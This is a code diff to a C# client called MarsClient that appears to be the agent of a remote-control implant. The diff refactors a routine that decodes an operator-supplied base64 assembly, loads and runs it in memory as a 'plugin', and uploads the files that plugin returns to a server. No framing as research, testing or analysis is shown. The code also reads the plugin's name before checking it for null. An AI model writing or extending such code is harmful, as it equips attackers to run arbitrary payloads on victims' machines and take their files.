@@ -171,7 +171,7 @@ namespace MarsClient
                     } else if (command[1] == "plugin") {
                         //the null here should be the parameters passed to the plugin that is being run
                         //result = PluginCommand(command[0], null);
-                        result = PluginCommandNew(command[0], null);
+                        result = RunPluginCommandFromBase64(command[0], null, null);
                     } else {
                         result = "Failed";
                     }
@@ -223,42 +223,31 @@ namespace MarsClient
             //return "did it";
         }
 
-        private string PluginCommandNew(string command, string[]? plugParam){
-            Plugin _plugin = PluginLoader.InitializeFromBase64(command); 
+        private string RunPluginCommandFromBase64(string binary, string command, string[]? plugParam){
+            Plugin _plugin = PluginLoader.InitializeFromBase64(binary); 
 
             Console.WriteLine($"Plugin loaded: {_plugin.Name}");
 
             if(_plugin == null){
-                return "Failed to load plugin. Plugin is null.";
+                return "Failed to load plugin. The plugin may be corrupt or not a valid plugin.";
             }
 
-            foreach(Type oType in _plugin.Assembly.GetTypes()){
-                try{
-                    dynamic c = Activator.CreateInstance(oType);
-                    var methods = oType.GetMethods();
-                    var method = oType.GetMethod("PluginMain");
-                    IDictionary<string, dynamic> dll_return = method.Invoke(c, plugParam);
+            IDictionary<string, dynamic> dll_return = _plugin.RunCommand(command, plugParam);
+            string exit_message = dll_return["ExitMessage"];
 
-                    Console.WriteLine($"Plugin invoked: {_plugin.Name}");
-                    if(dll_return["ExitCode"] == 0){
-                        // send files API
-                        if (dll_return.TryGetValue("Files", out dynamic files)) {
-                            Console.WriteLine("Sending files");
-                            for (int i = 0; i < files.Length; i++) 
-                            {
-                                this.SendFileToServer(files[i], Path.GetFileName(files[i]));
-                            }
-                        }
-                        string exit_message = dll_return["ExitMessage"];
-                        return $"Plugin ran successfully: {exit_message}";
-                    }else{
-                        string exit_message = dll_return["ExitMessage"];
-                        return $"Plugin failed to run: {exit_message}";
+            Console.WriteLine($"Plugin invoked: {_plugin.Name}");
+            if(dll_return["ExitCode"] == 0){
+                // send files API
+                if (dll_return.TryGetValue("Files", out dynamic files)) {
+                    Console.WriteLine("Sending files");
+                    for (int i = 0; i < files.Length; i++) 
+                    {
+                        this.SendFileToServer(files[i], Path.GetFileName(files[i]));
                     }
-                } catch (Exception e){
-                    
-                    continue;
                 }
+                return $"Plugin {_plugin.Name} ran successfully: {exit_message}";
+            }else{
+                return $"Plugin {_plugin.Name} failed to run: {exit_message}";
             }
 
             return "Failed to run plugin!";
